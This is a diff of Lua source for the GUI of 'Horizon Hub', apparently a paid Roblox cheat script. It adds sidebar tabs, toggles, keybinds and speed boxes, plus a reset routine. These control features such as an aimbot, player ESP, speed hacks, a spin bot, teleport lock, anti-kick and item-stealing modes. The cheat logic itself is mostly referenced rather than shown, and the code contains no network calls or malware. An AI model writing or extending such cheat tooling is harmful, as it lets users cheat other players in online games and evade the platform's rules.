+        __HH.mainFrame.Visible = true
+        miniToggleBtn.Visible = false
+    end)
+
+    local miniDrag, miniDragStart, miniStartPos
+    miniToggleBtn.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            miniDrag = true
+            miniDragStart = input.Position
+            miniStartPos = miniToggleBtn.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then miniDrag = false end
+            end)
+        end
+    end)
+    __HH.UIS.InputChanged:Connect(function(input)
+        if miniDrag and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - miniDragStart
+            miniToggleBtn.Position = UDim2.new(miniStartPos.X.Scale, miniStartPos.X.Offset + delta.X, miniStartPos.Y.Scale, miniStartPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    closeBtn.MouseButton1Click:Connect(function()
+        __HH.mainFrame.Visible = false
+        miniToggleBtn.Visible = true
+    end)
+
+    local Sidebar = Instance.new("Frame", __HH.mainFrame)
+    Sidebar.Name = "Sidebar"; Sidebar.Size = UDim2.new(0,165,1,-68)
+    Sidebar.Position = UDim2.new(0,0,0,67); Sidebar.BackgroundTransparency = 1; Sidebar.ZIndex = 3
+
+    local SidebarLine = Instance.new("Frame", Sidebar)
+    SidebarLine.Size = UDim2.new(0,1,1,0); SidebarLine.Position = UDim2.new(1,0,0,0)
+    SidebarLine.BackgroundColor3 = Color3.fromRGB(105, 205, 255); SidebarLine.BorderSizePixel = 0; SidebarLine.ZIndex = 3
+
+    -- Horizon Hub identity card: avatar, name and handle, based on the supplied layout.
+    local profileAvatar = Instance.new("ImageLabel", Sidebar)
+    profileAvatar.Name = "HorizonHubAvatar"; profileAvatar.Size = UDim2.new(0,54,0,54); profileAvatar.Position = UDim2.new(0,10,0,18)
+    profileAvatar.BackgroundColor3 = Color3.fromRGB(12,16,28); profileAvatar.BorderSizePixel = 0; profileAvatar.ZIndex = 5
+    Instance.new("UICorner", profileAvatar).CornerRadius = UDim.new(1,0)
+    local avatarStroke = Instance.new("UIStroke", profileAvatar); avatarStroke.Color = Color3.fromRGB(100,205,255); avatarStroke.Thickness = 1.2
+    task.spawn(function()
+        pcall(function()
+            local thumb = Players:GetUserThumbnailAsync(LP.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
+            if thumb and profileAvatar.Parent then profileAvatar.Image = thumb end
+        end)
+    end)
+    local profileName = Instance.new("TextLabel", Sidebar)
+    profileName.Size = UDim2.new(1,-74,0,22); profileName.Position = UDim2.new(0,70,0,18); profileName.BackgroundTransparency = 1
+    profileName.Text = LP.DisplayName; profileName.TextColor3 = Color3.fromRGB(190,230,255); profileName.Font = Enum.Font.GothamBlack; profileName.TextSize = 15; profileName.TextXAlignment = Enum.TextXAlignment.Left; profileName.ZIndex = 5
+    local profileHandle = Instance.new("TextLabel", Sidebar)
+    profileHandle.Size = UDim2.new(1,-74,0,18); profileHandle.Position = UDim2.new(0,70,0,41); profileHandle.BackgroundTransparency = 1
+    profileHandle.Text = "@" .. LP.Name; profileHandle.TextColor3 = Color3.fromRGB(165,230,255); profileHandle.TextStrokeColor3 = Color3.fromRGB(0,85,165); profileHandle.TextStrokeTransparency = 0.18; profileHandle.Font = Enum.Font.GothamBold; profileHandle.TextSize = 12; profileHandle.TextXAlignment = Enum.TextXAlignment.Left; profileHandle.ZIndex = 5
+    local handleGlow = Instance.new("UIGradient", profileHandle)
+    handleGlow.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(95,190,255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(220,245,255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(95,190,255))})
+
+    local TabContainer = Instance.new("Frame", Sidebar)
+    TabContainer.Size = UDim2.new(1,-20,1,-110); TabContainer.Position = UDim2.new(0,10,0,100)
+    TabContainer.BackgroundTransparency = 1; TabContainer.ZIndex = 3
+    local TabListLayout = Instance.new("UIListLayout", TabContainer)
+    TabListLayout.Padding = UDim.new(0,6); TabListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    local buyerLabel = Instance.new("TextLabel", Sidebar)
+    buyerLabel.Name = "HorizonHubBuyer"; buyerLabel.Size = UDim2.new(1,-82,0,20); buyerLabel.Position = UDim2.new(0,70,0,62)
+    buyerLabel.BackgroundColor3 = Color3.fromRGB(12,24,45); buyerLabel.BackgroundTransparency = .12; buyerLabel.BorderSizePixel = 0
+    buyerLabel.Text = "HORIZON V2 BUYER"; buyerLabel.TextColor3 = Color3.fromRGB(150,215,255); buyerLabel.Font = Enum.Font.GothamBold; buyerLabel.TextSize = 8; buyerLabel.ZIndex = 5
+    Instance.new("UICorner", buyerLabel).CornerRadius = UDim.new(0,6)
+    local buyerStroke = Instance.new("UIStroke", buyerLabel); buyerStroke.Color = Color3.fromRGB(75,165,235); buyerStroke.Thickness = 1
+
+    local ContentContainer = Instance.new("Frame", __HH.mainFrame)
+    ContentContainer.Size = UDim2.new(1,-180,1,-84); ContentContainer.Position = UDim2.new(0,170,0,74)
+    ContentContainer.BackgroundTransparency = 1; ContentContainer.ZIndex = 3
+
+    local currentTab = nil
+    local TabRefs = {contents = {}, btns = {}, underlines = {}, active = "Speed"}
+    local TabList = {"Speed","Combat","Mechns","Visual","Extra","Mobile"}
+
+    for i, name in ipairs(TabList) do
+        local wrapper = Instance.new("Frame", TabContainer)
+        wrapper.Size = UDim2.new(1,0,0,30)
+        wrapper.BackgroundTransparency = 1
+        wrapper.LayoutOrder = i
+
+        local btn = Instance.new("TextButton", wrapper)
+        btn.Size = UDim2.new(1,0,0,30)
+        btn.BackgroundTransparency = (i == 1) and 0.6 or 1
+        btn.BackgroundColor3 = Color3.fromRGB(100, 205, 255)
+        local tabDisplay = {Speed="Speed Boost", Combat="Important", Mechns="Key Bind", Visual="Visual", Extra="Settings", Mobile="Mobile"}
+        btn.Text = tabDisplay[name] or name
+        btn.TextColor3 = WHITE
+        btn.TextTransparency = (i == 1) and 0 or 0.5
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 11
+        btn.TextXAlignment = Enum.TextXAlignment.Left
+        btn.ZIndex = 5
+        local bp = Instance.new("UIPadding", btn)
+        bp.PaddingLeft = UDim.new(0,10)
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,6)
+
+        TabRefs.btns[name] = btn
+
+        local page = Instance.new("ScrollingFrame", ContentContainer)
+        page.Size = UDim2.new(1,0,1,0)
+        page.BackgroundTransparency = 1
+        page.CanvasSize = UDim2.new(0,0,0,0)
+        page.AutomaticCanvasSize = Enum.AutomaticSize.Y
+        page.ScrollBarThickness = 2
+        page.ScrollBarImageColor3 = WHITE
+        page.Visible = (i == 1)
+        page.ZIndex = 3
+        local pageLayout = Instance.new("UIListLayout", page)
+        pageLayout.Padding = UDim.new(0,10)
+        pageLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        local pagePad = Instance.new("UIPadding", page)
+        pagePad.PaddingLeft = UDim.new(0,4)
+        pagePad.PaddingRight = UDim.new(0,8)
+        pagePad.PaddingTop = UDim.new(0,6)
+        pagePad.PaddingBottom = UDim.new(0,6)
+
+        TabRefs.contents[name] = page
+
+        if i == 1 then
+            currentTab = {Btn = btn, Pg = page}
+        end
+
+        btn.MouseButton1Click:Connect(function()
+            if currentTab then
+                currentTab.Btn.BackgroundTransparency = 1
+                currentTab.Btn.TextTransparency = 0.5
+                currentTab.Pg.Visible = false
+            end
+            btn.BackgroundTransparency = 0.6
+            btn.TextTransparency = 0
+            page.Visible = true
+            currentTab = {Btn = btn, Pg = page}
+            TabRefs.active = name
+        end)
+    end
+
+    local function mkSect(parent, txt)
+        local f = Instance.new("Frame", parent)
+        f.Size = UDim2.new(1,0,0,16); f.BackgroundTransparency = 1
+        f.LayoutOrder = #parent:GetChildren() + 1
+        local l = Instance.new("TextLabel", f)
+        l.Size = UDim2.new(1,0,1,0); l.BackgroundTransparency = 1
+        l.Text = txt:upper(); l.TextColor3 = WHITE
+        l.Font = Enum.Font.GothamBlack; l.TextSize = 9
+        l.TextXAlignment = Enum.TextXAlignment.Left
+        local line = Instance.new("Frame", f)
+        line.Size = UDim2.new(1,0,0,1); line.Position = UDim2.new(0,0,1,-1)
+        line.BackgroundColor3 = WHITE; line.BackgroundTransparency = 0.75; line.BorderSizePixel = 0
+    end
+
+    local function mkRow(parent)
+        local f = Instance.new("Frame", parent)
+        f.Size = UDim2.new(1,0,0,32); f.BackgroundTransparency = 1
+        f.LayoutOrder = #parent:GetChildren() + 1
+        return f
+    end
+
+    local function mkLabel(row, txt)
+        local l = Instance.new("TextLabel", row)
+        l.Size = UDim2.new(0.6,0,1,0); l.Position = UDim2.new(0,0,0,0)
+        l.BackgroundTransparency = 1; l.Text = txt
+        l.TextColor3 = WHITE; l.Font = Enum.Font.GothamBold
+        l.TextSize = 12; l.TextXAlignment = Enum.TextXAlignment.Left
+    end
+
+    local function mkToggle(parent, txt, cb, initVal)
+        local row = mkRow(parent)
+        mkLabel(row, txt)
+        local chk = Instance.new("TextButton", row)
+        chk.Size = UDim2.new(0,18,0,18); chk.Position = UDim2.new(1,-24,0.5,-9)
+        chk.BackgroundColor3 = initVal and __HH.TOGGLE_ON_COLOR or CHECK_OFF
+        chk.BorderSizePixel = 0; chk.Text = ""; chk.ZIndex = 5
+        Instance.new("UICorner", chk).CornerRadius = UDim.new(0,4)
+        local chkStroke = Instance.new("UIStroke", chk)
+        chkStroke.Color = WHITE; chkStroke.Thickness = 1
+        local state = initVal == true
+        local function sv(s)
+            state = s
+            TS:Create(chk, TweenInfo.new(0.15), {BackgroundColor3 = s and __HH.TOGGLE_ON_COLOR or CHECK_OFF}):Play()
+        end
+        sv(state)
+        chk.MouseButton1Click:Connect(function()
+            if __HH._anyKeyListening then return end
+            state = not state; sv(state); cb(state)
+        end)
+        return sv
+    end
+
+    local function mkBoxRow(parent, txt, default, cb)
+        local row = mkRow(parent)
+        mkLabel(row, txt)
+        local tb = Instance.new("TextBox", row)
+        tb.Size = UDim2.new(0,60,0,22); tb.Position = UDim2.new(1,-65,0.5,-11)
+        tb.BackgroundColor3 = INP_BG; tb.Text = tostring(default)
+        tb.TextColor3 = WHITE; tb.Font = Enum.Font.GothamBold
+        tb.TextSize = 11; tb.ClearTextOnFocus = false; tb.ZIndex = 5
+        Instance.new("UICorner", tb).CornerRadius = UDim.new(0,6)
+        local bs = Instance.new("UIStroke", tb); bs.Color = DIM_LINE; bs.Thickness = 1
+        tb.Focused:Connect(function() TS:Create(bs, TweenInfo.new(0.12), {Color=WHITE}):Play() end)
+        tb.FocusLost:Connect(function()
+            TS:Create(bs, TweenInfo.new(0.12), {Color=DIM_LINE}):Play()
+            if cb then local n = tonumber(tb.Text); if n then cb(n) else tb.Text = tostring(default) end end
+        end)
+        return tb
+    end
+
+    local function mkKB(parent, kbEntry, cb)
+        local btn = Instance.new("TextButton", parent)
+        btn.Size = UDim2.new(0,40,0,18); btn.Position = UDim2.new(1,-110,0.5,-9)
+        btn.BackgroundColor3 = INP_BG; btn.BorderSizePixel = 0
+        local function getLabel()
+            return (kbEntry.gp and __HH.getKeyDisplayName(kbEntry.gp, true)) or (kbEntry.kb and kbEntry.kb.Name) or "None"
+        end
+        btn.Text = getLabel(); btn.TextColor3 = WHITE
+        btn.Font = Enum.Font.GothamBold; btn.TextSize = 8; btn.ZIndex = 5
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
+        local bs = Instance.new("UIStroke", btn); bs.Color = DIM_LINE; bs.Thickness = 1
+        local li, lc, pv, listenStart = false, nil, btn.Text, 0
+        btn.MouseButton1Click:Connect(function()
+            if li then
+                li = false; __HH._anyKeyListening = false
+                if lc then lc:Disconnect(); lc = nil end; btn.Text = pv; return
+            end
+            pv = btn.Text; li = true; __HH._anyKeyListening = true; listenStart = tick(); btn.Text = "..."
+            lc = __HH.UIS.InputBegan:Connect(function(inp)
+                if not li then return end
+                if inp.KeyCode == Enum.KeyCode.Escape then
+                    li = false; __HH._anyKeyListening = false
+                    if lc then lc:Disconnect(); lc = nil end; btn.Text = pv; return
+                end
+                local isGp = __HH.isGamepadInput(inp)
+                if isGp and tick()-listenStart < 0.15 then return end
+                if not __HH.isBindableInput(inp) then return end
+                btn.Text = __HH.getKeyDisplayName(inp.KeyCode, isGp)
+                pv = btn.Text; li = false; __HH._anyKeyListening = false
+                if lc then lc:Disconnect(); lc = nil end
+                if cb then cb(inp.KeyCode, isGp) end
+            end)
+        end)
+        return btn
+    end
+
+    local function mkToggleKB(parent, txt, kbEntry, onToggle, onKB)
+        local row = mkRow(parent)
+        mkLabel(row, txt)
+        if kbEntry then
+            mkKB(row, kbEntry, function(k, isGp)
+                if isGp then kbEntry.gp = k; kbEntry.kb = nil else kbEntry.kb = k; kbEntry.gp = nil end
+                if onKB then onKB(k, isGp) end
+            end)
+        end
+        local chk = Instance.new("TextButton", row)
+        chk.Size = UDim2.new(0,18,0,18); chk.Position = UDim2.new(1,-24,0.5,-9)
+        chk.BackgroundColor3 = CHECK_OFF; chk.BorderSizePixel = 0; chk.Text = ""; chk.ZIndex = 5
+        Instance.new("UICorner", chk).CornerRadius = UDim.new(0,4)
+        local chkStroke = Instance.new("UIStroke", chk); chkStroke.Color = WHITE; chkStroke.Thickness = 1
+        local state = false
+        local function sv(s)
+            state = s
+            TS:Create(chk, TweenInfo.new(0.15), {BackgroundColor3 = s and __HH.TOGGLE_ON_COLOR or CHECK_OFF}):Play()
+        end
+        chk.MouseButton1Click:Connect(function()
+            if __HH._anyKeyListening then return end
+            state = not state; sv(state); if onToggle then onToggle(state) end
+        end)
+        return sv
+    end
+
+    local function mkActionRow(parent, txt, onActivate, kbEntry)
+        local row = mkRow(parent)
+        mkLabel(row, txt)
+        if kbEntry then
+            mkKB(row, kbEntry, function(k, isGp)
+                if isGp then kbEntry.gp = k; kbEntry.kb = nil else kbEntry.kb = k; kbEntry.gp = nil end
+                saveConfig()
+            end)
+        end
+        local btn = Instance.new("TextButton", row)
+        btn.Size = UDim2.new(0,40,0,20); btn.Position = UDim2.new(1,-46,0.5,-10)
+        btn.BackgroundColor3 = BTN_ACT; btn.BorderSizePixel = 0
+        btn.Text = ">"; btn.TextColor3 = WHITE
+        btn.Font = Enum.Font.GothamBlack; btn.TextSize = 10
+        btn.AutoButtonColor = false; btn.ZIndex = 5
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,5)
+        local bs = Instance.new("UIStroke", btn); bs.Color = WHITE; bs.Thickness = 1
+        btn.MouseButton1Click:Connect(function()
+            TS:Create(btn, TweenInfo.new(0.06), {BackgroundColor3 = Color3.fromRGB(100, 205, 255)}):Play()
+            TS:Create(btn, TweenInfo.new(0.06), {TextColor3 = BLACK}):Play()
+            task.delay(0.14, function()
+                TS:Create(btn, TweenInfo.new(0.1), {BackgroundColor3 = BTN_ACT}):Play()
+                TS:Create(btn, TweenInfo.new(0.1), {TextColor3 = WHITE}):Play()
+            end)
+            if onActivate then onActivate() end
+        end)
+        return row
+    end
+
+    local sfSpeed   = TabRefs.contents["Speed"]
+    local sfCombat  = TabRefs.contents["Combat"]
+    local sfMechns  = TabRefs.contents["Mechns"]
+    local sfVisual  = TabRefs.contents["Visual"]
+    local sfExtra   = TabRefs.contents["Extra"]
+    local sfMobile  = TabRefs.contents["Mobile"]
+
+    -- ─── Shared Reset All Settings logic ───────────────────────────────────
+    -- Wipes every saved toggle/speed/keybind/UI setting back to the script's
+    -- hardcoded defaults. Does NOT touch the selected device (PC/Mobile/
+    -- Controller) — that is what "Reset Device" is for. Used by both the
+    -- Extra tab and Mobile tab "Reset All Settings" buttons.
+    local function performResetAllSettings()
+        -- Turn off anything currently running so the reset takes effect
+        -- immediately, not just on the next join.
+        pcall(function() if __HH.tpLockEnabled and stopTPLock then stopTPLock() end end)
+        pcall(function() if __HH.batV2Enabled and toggleBatV2 then toggleBatV2() end end)
+        pcall(function() if autoLeftEnabled and stopAutoLeft then autoLeftEnabled = false; stopAutoLeft() end end)
+        pcall(function() if autoRightEnabled and stopAutoRight then autoRightEnabled = false; stopAutoRight() end end)
+        pcall(function() if __HH.antiRagdollEnabled and __HH.stopAntiRagdoll then __HH.stopAntiRagdoll() end end)
+        pcall(function() if __HH.medusaCounterEnabled and stopMedusaCounter then stopMedusaCounter() end end)
+        pcall(function() if __HH.batCounterEnabled and stopBatCounter then stopBatCounter() end end)
+        pcall(function() if __HH.unwalkEnabled and __HH.stopUnwalk then __HH.stopUnwalk() end end)
+        pcall(function() if __HH.antiLagEnabled and disableAntiLag then disableAntiLag() end end)
+        pcall(function() if __HH.stretchRezEnabled and disableStretchRez then disableStretchRez() end end)
+        pcall(function() if __HH.autoTPEnabled and __HH.stopAutoTP then __HH.stopAutoTP() end end)
+        pcall(function() if __HH.antiDieEnabled and __HH.stopAntiDie then __HH.stopAntiDie() end end)
+        pcall(function() if __HH.espEnabled and stopPlayerESP then stopPlayerESP() end end)
+        pcall(function() if __HH.bodyLockEnabled and __HH.stopBodyLock then __HH.stopBodyLock() end end)
+        pcall(function() if __HH.headlessEnabled and applyHeadless and LP.Character then applyHeadless(LP.Character, false) end end)
+        pcall(function() if __HH.korbloxEnabled and applyKorblox and LP.Character then applyKorblox(LP.Character, false) end end)
+        pcall(function() if applyAccessoryPack then applyAccessoryPack("Off") end end)
+        pcall(function() if _G.PureSpinBot and _G.PureSpinBot.enabled and _G.PureSpinBot.stop then _G.PureSpinBot.enabled = false; _G.PureSpinBot.stop() end end)
+        pcall(function() if _G.HorizonStealModes then _G.HorizonStealModes.SetEnabled(false) end end)
+        pcall(function() if _G.PureMirrorTPDown and _G.PureMirrorTPDown.setEnabled then _G.PureMirrorTPDown.setEnabled(false) end end)
+        pcall(function() if _G.PureBatSpam and _G.PureBatSpam.setEnabled then _G.PureBatSpam.setEnabled(false) end end)
+        pcall(function() if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setEnabled then _G.Round3SpeedBooster.setEnabled(false) end end)
+
+        -- Speeds / numeric values back to script defaults.
+        NS = 60; CS = 30
+        LAGGER_SPEED = 13; LAGGER_CARRY_SPEED = 13
+        aimbotV1Speed = 56
+        autoCarrySpeedEnabled = false
+        carrySpeedActive = false; laggerModeEnabled = false; laggerCarryToggled = false
+        speedMode = false; laggerPhase = 0
+        pcall(function()
+            if _G.Round3SpeedBooster then
+                if _G.Round3SpeedBooster.setNormalSpeed then _G.Round3SpeedBooster.setNormalSpeed(62) end
+                if _G.Round3SpeedBooster.setCarrySpeed then _G.Round3SpeedBooster.setCarrySpeed(32) end
+                if _G.Round3SpeedBooster.setForceCarry then _G.Round3SpeedBooster.setForceCarry(false) end
+            end
+        end)
+        batAimMode = "normal"
+        uiScaleValue = 0.6
+        __HH.autoTPHeight = 20
+        __HH.floatHeight = 6
+        __HH.mobileButtonsSize = 80
+        __HH.bodyLockRange = 20
+        __HH.currentSkyTheme = "Off"
+        currentAccessoryPack = "Off"
+        __HH.aceSelectedAnimationPack = "OFF"
+
+        -- Toggles back to OFF / defaults.
+        __HH.antiRagdollEnabled = false
+        __HH.infJumpEnabled = false
+        __HH.infJumpMode = "manual"
+        __HH.medusaCounterEnabled = false
+        __HH.medusaResetEnabled = false
+        __HH.batCounterEnabled = false
+        __HH.unwalkEnabled = false
+        __HH.antiLagEnabled = false
+        __HH.stretchRezEnabled = false
+        __HH.autoTPEnabled = false
+        __HH.autoJumpBrainrot = false
+        __HH.floatEnabled = false
+        __HH.guiTransparencyEnabled = false
+        __HH.circleButtonsEnabled = false
+        __HH.shapeButtonsEnabled = false
+        __HH.rectangularButtonsEnabled = false
+        __HH.antiDieEnabled = false
+        __HH.autoResetOnDeath = false
+        __HH.uiLocked = false; _G.YousefUiLocked = false
+        __HH.perButtonDragEnabled = true
+        __HH.batV2Enabled = false
+        __HH.espEnabled = false
+        __HH.headlessEnabled = false
+        __HH.korbloxEnabled = false
+        __HH.bodyLockEnabled = false
+        __HH.antiFlingEnabled = false
+        __HH.tpLockEnabled = false
+        autoSwingEnabled = false
+        autoLeftEnabled = false; autoRightEnabled = false
+        antiKickEnabled = false
+
+        -- Mobile-specific settings back to defaults.
+        __HH.mobileButtonsEnabled = (__HH.selectedDevice == "MOBILE")
+
+        -- Keybinds back to their original defaults.
+        __HH.KB.DropBrainrot  = {kb = Enum.KeyCode.X,           gp = nil}
+        __HH.KB.TPLock        = {kb = Enum.KeyCode.E,           gp = nil}
+        __HH.KB.TPFloor       = {kb = Enum.KeyCode.F,           gp = nil}
+        __HH.KB.GuiHide       = {kb = Enum.KeyCode.LeftControl, gp = nil}
+        __HH.KB.SpeedToggle   = {kb = Enum.KeyCode.Q,           gp = nil}
+        __HH.KB.LaggerToggle  = {kb = Enum.KeyCode.G,           gp = nil}
+        __HH.KB.InstaReset    = {kb = Enum.KeyCode.R,           gp = nil}
+        __HH.KB.AutoLeft      = {kb = Enum.KeyCode.Z,           gp = nil}
+        __HH.KB.AutoRight     = {kb = Enum.KeyCode.C,           gp = nil}
+        __HH.KB.BatV2Toggle   = {kb = Enum.KeyCode.V,           gp = nil}
+
+        -- Button visibility (mobile buttons) back to all-on.
+        __HH.buttonVisibility = {
+            drop=true, tpDown=true, batV1=true, batV2=true, tpLock=true,
+            lagger=true, laggerCarry=true, carrySpeed=true,
+            instaReset=true,
+        }
+
+        -- Reset saved mobile button positions too, so "Reset All Settings"
+        -- from the Mobile tab also puts the floating buttons back at their
+        -- default layout.
+        pcall(function() if writefile then writefile(MOB_POS_FILE, "{}") end end)
+
+        -- Persist the wipe immediately, then rebuild the whole UI so every
+        -- toggle/keybind label reflects the new defaults without needing a
+        -- rejoin.
+        saveConfig()
+        task.delay(0.3, function()
+            pcall(function()
+                if __HH.mainFrame then __HH.mainFrame:Destroy() end
+                buildGui()
+                applyState()
+                if __HH.mobileButtonsEnabled and buildMobileButtons then task.spawn(buildMobileButtons)
+                elseif destroyMobileButtons then destroyMobileButtons() end
+                if __HH.mainFrame then __HH.mainFrame.Visible = true end
+            end)
+        end)
+    end
+
+    -- Attaches a two-click "arm/confirm" reset flow to any button, calling
+    -- performResetAllSettings() and optionally flashing a status message.
+    local function wireResetAllButton(btn, defaultText, flashStatusFn)
+        local armed = false
+        local armedUntil = 0
+        btn.MouseButton1Click:Connect(function()
+            if not armed or tick() > armedUntil then
+                armed = true
+                armedUntil = tick() + 3
+                btn.Text = "Confirm?"
+                task.delay(3, function()
+                    if armed and tick() > armedUntil - 0.05 then
+                        armed = false
+                        btn.Text = defaultText
+                    end
+                end)
+                return
+            end
+            armed = false
+            btn.Text = defaultText
+            performResetAllSettings()
+            if flashStatusFn then flashStatusFn("All settings reset to default!") end
+        end)
+    end
+
+    -- Speed control helper: label + [-] [value box] [+] buttons
+    local function mkSpeedCtrl(parent, txt, getVal, setVal, step)
+        step = step or 5
+        local row = Instance.new("Frame", parent)
+        row.Size = UDim2.new(1,0,0,32); row.BackgroundTransparency = 1
+        row.LayoutOrder = #parent:GetChildren() + 1
+        mkLabel(row, txt)
+        local minBtn = Instance.new("TextButton", row)
+        minBtn.Size = UDim2.new(0,24,0,22); minBtn.Position = UDim2.new(1,-148,0.5,-11)
+        minBtn.BackgroundColor3 = BTN_ACT; minBtn.BorderSizePixel = 0
+        minBtn.Text = "-"; minBtn.TextColor3 = WHITE
+        minBtn.Font = Enum.Font.GothamBlack; minBtn.TextSize = 15
+        minBtn.AutoButtonColor = false; minBtn.ZIndex = 5
+        Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0,5)
+        local mStroke = Instance.new("UIStroke", minBtn); mStroke.Color = WHITE; mStroke.Thickness = 1
+        local valTb = Instance.new("TextBox", row)
+        valTb.Size = UDim2.new(0,52,0,22); valTb.Position = UDim2.new(1,-120,0.5,-11)
+        valTb.BackgroundColor3 = INP_BG; valTb.Text = tostring(getVal())
+        valTb.TextColor3 = WHITE; valTb.Font = Enum.Font.GothamBold
+        valTb.TextSize = 11; valTb.ClearTextOnFocus = false
+        valTb.TextXAlignment = Enum.TextXAlignment.Center; valTb.ZIndex = 5
+        Instance.new("UICorner", valTb).CornerRadius = UDim.new(0,5)
+        local tbStroke = Instance.new("UIStroke", valTb); tbStroke.Color = DIM_LINE; tbStroke.Thickness = 1
+        valTb.Focused:Connect(function() TS:Create(tbStroke, TweenInfo.new(0.12), {Color=WHITE}):Play() end)
+        valTb.FocusLost:Connect(function()
+            TS:Create(tbStroke, TweenInfo.new(0.12), {Color=DIM_LINE}):Play()
+            local n = tonumber(valTb.Text)
+            if n then setVal(math.clamp(math.floor(n), 1, 500)) end
+            valTb.Text = tostring(getVal())
+        end)
+        local plusBtn = Instance.new("TextButton", row)
+        plusBtn.Size = UDim2.new(0,24,0,22); plusBtn.Position = UDim2.new(1,-64,0.5,-11)
+        plusBtn.BackgroundColor3 = BTN_ACT; plusBtn.BorderSizePixel = 0
+        plusBtn.Text = "+"; plusBtn.TextColor3 = WHITE
+        plusBtn.Font = Enum.Font.GothamBlack; plusBtn.TextSize = 15
+        plusBtn.AutoButtonColor = false; plusBtn.ZIndex = 5
+        Instance.new("UICorner", plusBtn).CornerRadius = UDim.new(0,5)
+        local pStroke = Instance.new("UIStroke", plusBtn); pStroke.Color = WHITE; pStroke.Thickness = 1
+        local function flash(b)
+            TS:Create(b, TweenInfo.new(0.07), {BackgroundColor3=WHITE}):Play()
+            task.delay(0.14, function() TS:Create(b, TweenInfo.new(0.10), {BackgroundColor3=BTN_ACT}):Play() end)
+        end
+        minBtn.MouseButton1Click:Connect(function()
+            setVal(math.max(1, getVal() - step)); valTb.Text = tostring(getVal()); flash(minBtn)
+        end)
+        plusBtn.MouseButton1Click:Connect(function()
+            setVal(math.min(500, getVal() + step)); valTb.Text = tostring(getVal()); flash(plusBtn)
+        end)
+    end
+
+    mkSect(sfSpeed, "Speed Values")
+    local grabSpeedTb
+    mkBoxRow(sfSpeed, "Normal Speed", NS, function(v)
+        if v>0 and v<=500 then
+            NS=v; CS=math.max(1, math.floor(NS/2)); saveConfig()
+            -- Grab Speed is auto-derived from Normal Speed, so its own
+            -- textbox must reflect the new value immediately instead of
+            -- showing a stale number until the panel is reopened.
+            if grabSpeedTb then grabSpeedTb.Text = tostring(CS) end
+        end
+    end)
+    grabSpeedTb = mkBoxRow(sfSpeed, "Grab Speed",   CS, function(v) if v>0 and v<=500 then CS=v; saveConfig() end end)
+    mkBoxRow(sfSpeed, "Lagger Normal", LAGGER_SPEED, function(v) if v>0 and v<=500 then LAGGER_SPEED=v end; saveConfig() end)
+    mkBoxRow(sfSpeed, "Lagger Carry", LAGGER_CARRY_SPEED, function(v) if v>0 and v<=500 then LAGGER_CARRY_SPEED=v end; saveConfig() end)
+    mkBoxRow(sfSpeed, "AIM BOT Speed", aimbotV1Speed, function(v) if v>0 and v<=500 then aimbotV1Speed=v end; saveConfig() end)
+    setAutoCarrySpeedVisual = mkToggle(sfSpeed, "Auto Switch Speed", function(on)
+        autoCarrySpeedEnabled = on
+        if __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
+        saveConfig()
+    end, autoCarrySpeedEnabled)
+
+    mkSect(sfSpeed, "Round 3 Speed Boost")
+    mkToggle(sfSpeed, "ROUND 3 SPEED", function(on)
+        if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setEnabled then
+            _G.Round3SpeedBooster.setEnabled(on)
+        end
+        saveConfig()
+    end, (_G.Round3SpeedBooster and _G.Round3SpeedBooster.Enabled) == true)
+    mkBoxRow(sfSpeed, "Normal Speed", (_G.Round3SpeedBooster and _G.Round3SpeedBooster.NormalSpeed) or 62, function(v)
+        if v>0 and v<=500 then
+            if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setNormalSpeed then
+                _G.Round3SpeedBooster.setNormalSpeed(v)
+            end
+        end
+        saveConfig()
+    end)
+    mkBoxRow(sfSpeed, "Carry Speed", (_G.Round3SpeedBooster and _G.Round3SpeedBooster.CarrySpeed) or 32, function(v)
+        if v>0 and v<=500 then
+            if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setCarrySpeed then
+                _G.Round3SpeedBooster.setCarrySpeed(v)
+            end
+        end
+        saveConfig()
+    end)
+    mkToggle(sfSpeed, "Force Carry", function(on)
+        if _G.Round3SpeedBooster and _G.Round3SpeedBooster.setForceCarry then
+            _G.Round3SpeedBooster.setForceCarry(on)
+        end
+        saveConfig()
+    end, (_G.Round3SpeedBooster and _G.Round3SpeedBooster.ForceCarry) == true)
+
+    mkSect(sfCombat, "Combat")
+    setAutoSwingVisual   = mkToggle(sfCombat, "Auto Swing",     function(on) autoSwingEnabled=on; saveConfig() end, autoSwingEnabled)
+    if _G.PureSpinBot then
+        _G.PureSpinBot.setVisual = mkToggle(sfCombat, "SPIN BOT", function(on)
+            _G.PureSpinBot.setEnabled(on)
+            saveConfig()
+        end, _G.PureSpinBot.enabled)
+    end
+    setAntiRagVisual     = mkToggle(sfCombat, "Anti Ragdoll",   function(on) __HH.antiRagdollEnabled=on; if on then __HH.startAntiRagdoll() else __HH.stopAntiRagdoll() end; saveConfig() end, __HH.antiRagdollEnabled)
+    setMedusaResetVisual = mkToggle(sfCombat, "Medusa Reset",   function(on) __HH.medusaResetEnabled=on; saveConfig() end, __HH.medusaResetEnabled)
+    setUnwalkVisual      = mkToggle(sfCombat, "Unwalk",         function(on) __HH.unwalkEnabled=on; if on then __HH.startUnwalk() else __HH.stopUnwalk() end; saveConfig() end, __HH.unwalkEnabled)
+
+    mkSect(sfCombat, "Body Protection")
+    __HH.setBodyLockVisual = mkToggle(sfCombat, "Body Lock", function(on)
